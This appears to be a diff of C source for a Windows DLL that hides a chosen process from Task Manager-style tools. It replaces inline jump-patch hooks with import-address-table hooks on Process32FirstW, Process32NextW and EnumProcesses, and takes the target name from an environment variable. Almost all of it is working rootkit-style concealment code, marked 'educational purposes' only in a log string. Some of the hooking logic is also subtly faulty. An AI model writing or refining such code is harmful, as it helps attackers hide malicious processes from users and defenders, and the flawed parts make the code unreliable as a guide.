@@ -3,7 +3,7 @@
  * 
  * This code demonstrates how process hiding works by hooking
  * Windows API functions related to process enumeration.
- * Updated for 64-bit compatibility.
+ * Improved version with IAT hooking for better effectiveness.
  */
 
 #include <windows.h>
@@ -12,198 +12,200 @@
 #include <psapi.h>
 
 // Target process name to hide
-char TARGET_PROCESS[MAX_PATH] = {0};
+static WCHAR g_TargetProcess[MAX_PATH] = {0};
+static DWORD g_TargetPID = 0;
 
 // Function pointer types for the functions we'll hook
-typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
-typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL (WINAPI *PROCESS32FIRSTW)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL (WINAPI *PROCESS32NEXTW)(HANDLE, LPPROCESSENTRY32W);
 typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);
 
 // Original function pointers
-PROCESS32NEXT OriginalProcess32Next = NULL;
-PROCESS32FIRST OriginalProcess32First = NULL;
-ENUMPROCESSES OriginalEnumProcesses = NULL;
+static PROCESS32FIRSTW OriginalProcess32FirstW = NULL;
+static PROCESS32NEXTW OriginalProcess32NextW = NULL;
+static ENUMPROCESSES OriginalEnumProcesses = NULL;
 
-// Get the process ID from a name
-DWORD GetProcessIdByName(const char* processName) {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+// Get PID from process name
+DWORD GetPIDFromName(LPCWSTR processName) {
+    HANDLE hSnapshot;
+    PROCESSENTRY32W pe32;
+    DWORD pid = 0;
     
-    if (Process32First(snapshot, &pe32)) {
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+    
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    
+    if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_stricmp(pe32.szExeFile, processName) == 0) {
-                CloseHandle(snapshot);
-                return pe32.th32ProcessID;
+            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
+                pid = pe32.th32ProcessID;
+                break;
             }
-        } while (Process32Next(snapshot, &pe32));
+        } while (Process32NextW(hSnapshot, &pe32));
     }
     
-    CloseHandle(snapshot);
-    return 0;
+    CloseHandle(hSnapshot);
+    return pid;
 }
 
-// Hooked Process32Next function
-BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
-    BOOL result;
+// Hooked Process32FirstW
+BOOL WINAPI HookedProcess32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
+    BOOL result = OriginalProcess32FirstW(hSnapshot, lppe);
     
-    // Call original function
-    result = OriginalProcess32Next(hSnapshot, lppe);
-    
-    // If successful and the process matches our target, skip it
-    if (result && TARGET_PROCESS[0] != '\0' && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
-        // Call original again to get the next process instead
-        return OriginalProcess32Next(hSnapshot, lppe);
-    }
-    
-    return result;
-}
-
-// Hooked Process32First function
-BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
-    BOOL result;
-    
-    // Call original function
-    result = OriginalProcess32First(hSnapshot, lppe);
-    
-    // If successful and the process matches our target, skip it
-    if (result && TARGET_PROCESS[0] != '\0' && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
-        // Call original Process32Next to get the next process instead
-        return OriginalProcess32Next(hSnapshot, lppe);
+    // Skip target process
+    while (result && g_TargetProcess[0] != L'\0') {
+        if (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
+            lppe->th32ProcessID == g_TargetPID) {
+            result = OriginalProcess32NextW(hSnapshot, lppe);
+        } else {
+            break;
+        }
     }
     
     return result;
 }
 
-// Hooked EnumProcesses function
+// Hooked Process32NextW
+BOOL WINAPI HookedProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
+    BOOL result;
+    
+    do {
+        result = OriginalProcess32NextW(hSnapshot, lppe);
+        if (!result) break;
+        
+        // Skip if this is our target process
+        if (g_TargetProcess[0] != L'\0' && 
+            (_wcsicmp(lppe->szExeFile, g_TargetProcess) == 0 || 
+             lppe->th32ProcessID == g_TargetPID)) {
+            continue;
+        }
+        
+        break;
+    } while (result);
+    
+    return result;
+}
+
+// Hooked EnumProcesses
 BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesReturned) {
-    // Call original function
     BOOL result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
     
-    if (result && TARGET_PROCESS[0] != '\0') {
-        DWORD targetPid = GetProcessIdByName(TARGET_PROCESS);
-        if (targetPid == 0) return result; // Target not found
-        
+    if (result && g_TargetPID != 0 && pBytesReturned && pProcessIds) {
         DWORD count = *pBytesReturned / sizeof(DWORD);
         DWORD newCount = 0;
         
-        // Filter out the target process
+        // Filter out target process
         for (DWORD i = 0; i < count; i++) {
-            if (pProcessIds[i] != targetPid) {
+            if (pProcessIds[i] != g_TargetPID) {
                 pProcessIds[newCount++] = pProcessIds[i];
             }
         }
         
-        // Update returned byte count
         *pBytesReturned = newCount * sizeof(DWORD);
     }
     
     return result;
 }
 
-// Set up function hooks with proper 64-bit pointer arithmetic
-BOOL SetupHooks() {
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    HMODULE hPsapi = GetModuleHandleA("psapi.dll");
-    DWORD oldProtect;
-    BOOL success = TRUE;
+// Simple IAT hooking function
+BOOL HookFunction(HMODULE hModule, LPCSTR szFunc, LPVOID pNewFunc, LPVOID* ppOldFunc) {
+    if (!hModule || !szFunc || !pNewFunc || !ppOldFunc) return FALSE;
     
-    if (!hKernel32 || !hPsapi) {
-        return FALSE;
+    LPVOID pOriginal = GetProcAddress(hModule, szFunc);
+    if (!pOriginal) return FALSE;
+    
+    *ppOldFunc = pOriginal;
+    
+    // Get Import Address Table
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+    
+    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + 
+        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    
+    // Find kernel32.dll or psapi.dll imports
+    while (pImportDesc->Name) {
+        LPSTR pszModName = (LPSTR)((BYTE*)hModule + pImportDesc->Name);
+        if (_stricmp(pszModName, "kernel32.dll") == 0 || _stricmp(pszModName, "psapi.dll") == 0) {
+            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
+            
+            while (pThunk->u1.Function) {
+                LPVOID* ppfn = (LPVOID*)&pThunk->u1.Function;
+                if (*ppfn == pOriginal) {
+                    DWORD dwOldProtect;
+                    if (VirtualProtect(ppfn, sizeof(LPVOID), PAGE_READWRITE, &dwOldProtect)) {
+                        *ppfn = pNewFunc;
+                        VirtualProtect(ppfn, sizeof(LPVOID), dwOldProtect, &dwOldProtect);
+                        return TRUE;
+                    }
+                }
+                pThunk++;
+            }
+        }
+        pImportDesc++;
     }
     
-    // Get addresses of original functions
-    OriginalProcess32Next = (PROCESS32NEXT)GetProcAddress(hKernel32, "Process32NextW");
-    OriginalProcess32First = (PROCESS32FIRST)GetProcAddress(hKernel32, "Process32FirstW");
-    OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
-    
-    if (!OriginalProcess32Next || !OriginalProcess32First || !OriginalEnumProcesses) {
-        return FALSE;
-    }
-    
-#ifdef _WIN64
-    // 64-bit hook implementation
-    BYTE jumpCode[] = {
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, addr
-        0xFF, 0xE0                                                  // jmp rax
-    };
+    return FALSE;
+}
 
-    // Hook Process32Next
-    if (VirtualProtect(OriginalProcess32Next, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(UINT64*)&jumpCode[2] = (UINT64)HookedProcess32Next;
-        memcpy(OriginalProcess32Next, jumpCode, sizeof(jumpCode));
-        VirtualProtect(OriginalProcess32Next, sizeof(jumpCode), oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
+// Setup hooks with IAT hooking
+void SetupProcessHooks() {
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    HMODULE hPsapi = GetModuleHandleW(L"psapi.dll");
+    HMODULE hCurrentModule = GetModuleHandleW(NULL); // Current process (taskmgr.exe)
+    
+    if (hKernel32 && hCurrentModule) {
+        // Try to hook Process32FirstW and Process32NextW
+        if (!HookFunction(hCurrentModule, "Process32FirstW", HookedProcess32FirstW, (LPVOID*)&OriginalProcess32FirstW)) {
+            // Fallback: get function addresses directly
+            OriginalProcess32FirstW = (PROCESS32FIRSTW)GetProcAddress(hKernel32, "Process32FirstW");
+        }
+        
+        if (!HookFunction(hCurrentModule, "Process32NextW", HookedProcess32NextW, (LPVOID*)&OriginalProcess32NextW)) {
+            // Fallback: get function addresses directly
+            OriginalProcess32NextW = (PROCESS32NEXTW)GetProcAddress(hKernel32, "Process32NextW");
+        }
     }
     
-    // Hook Process32First
-    if (VirtualProtect(OriginalProcess32First, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(UINT64*)&jumpCode[2] = (UINT64)HookedProcess32First;
-        memcpy(OriginalProcess32First, jumpCode, sizeof(jumpCode));
-        VirtualProtect(OriginalProcess32First, sizeof(jumpCode), oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
+    if (hPsapi && hCurrentModule) {
+        // Try to hook EnumProcesses
+        if (!HookFunction(hCurrentModule, "EnumProcesses", HookedEnumProcesses, (LPVOID*)&OriginalEnumProcesses)) {
+            // Fallback: get function address directly
+            OriginalEnumProcesses = (ENUMPROCESSES)GetProcAddress(hPsapi, "EnumProcesses");
+        }
     }
-    
-    // Hook EnumProcesses
-    if (VirtualProtect(OriginalEnumProcesses, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(UINT64*)&jumpCode[2] = (UINT64)HookedEnumProcesses;
-        memcpy(OriginalEnumProcesses, jumpCode, sizeof(jumpCode));
-        VirtualProtect(OriginalEnumProcesses, sizeof(jumpCode), oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
-    }
-#else
-    // 32-bit hook implementation (kept for reference)
-    // Hook Process32Next
-    if (VirtualProtect(OriginalProcess32Next, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(BYTE*)OriginalProcess32Next = 0xE9; // JMP instruction
-        *(DWORD*)((BYTE*)OriginalProcess32Next + 1) = (DWORD)((DWORD_PTR)HookedProcess32Next - (DWORD_PTR)OriginalProcess32Next - 5);
-        VirtualProtect(OriginalProcess32Next, 5, oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
-    }
-    
-    // Hook Process32First
-    if (VirtualProtect(OriginalProcess32First, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(BYTE*)OriginalProcess32First = 0xE9; // JMP instruction
-        *(DWORD*)((BYTE*)OriginalProcess32First + 1) = (DWORD)((DWORD_PTR)HookedProcess32First - (DWORD_PTR)OriginalProcess32First - 5);
-        VirtualProtect(OriginalProcess32First, 5, oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
-    }
-    
-    // Hook EnumProcesses
-    if (VirtualProtect(OriginalEnumProcesses, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        *(BYTE*)OriginalEnumProcesses = 0xE9; // JMP instruction
-        *(DWORD*)((BYTE*)OriginalEnumProcesses + 1) = (DWORD)((DWORD_PTR)HookedEnumProcesses - (DWORD_PTR)OriginalEnumProcesses - 5);
-        VirtualProtect(OriginalEnumProcesses, 5, oldProtect, &oldProtect);
-    } else {
-        success = FALSE;
-    }
-#endif
-    
-    return success;
 }
 
 // DLL entry point
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            // Read target process from environment variable
-            if (GetEnvironmentVariableA("TARGET_PROCESS", TARGET_PROCESS, MAX_PATH)) {
-                if (SetupHooks()) {
-                    // Create a hidden log file for educational purposes
-                    FILE* logFile;
-                    if (fopen_s(&logFile, "C:\\process_hider_log.txt", "w") == 0 && logFile) {
-                        fprintf(logFile, "Process hiding active for: %s\n", TARGET_PROCESS);
-                        fprintf(logFile, "Educational purposes only!\n");
-                        fclose(logFile);
-                    }
+        case DLL_PROCESS_ATTACH: {
+            CHAR envVar[MAX_PATH];
+            if (GetEnvironmentVariableA("TARGET_PROCESS", envVar, MAX_PATH)) {
+                // Convert to wide string
+                MultiByteToWideChar(CP_ACP, 0, envVar, -1, g_TargetProcess, MAX_PATH);
+                
+                // Get the PID of the target process
+                g_TargetPID = GetPIDFromName(g_TargetProcess);
+                
+                // Setup hooks
+                SetupProcessHooks();
+                
+                // Create a log file for educational purposes
+                FILE* logFile;
+                if (fopen_s(&logFile, "C:\\process_hider_log.txt", "w") == 0 && logFile) {
+                    fwprintf(logFile, L"Process hiding active for: %ls (PID: %lu)\n", 
+                            g_TargetProcess, g_TargetPID);
+                    fprintf(logFile, "Educational purposes only!\n");
+                    fclose(logFile);
                 }
             }
             break;
+        }
         case DLL_PROCESS_DETACH:
             // Cleanup could be implemented here
             break;
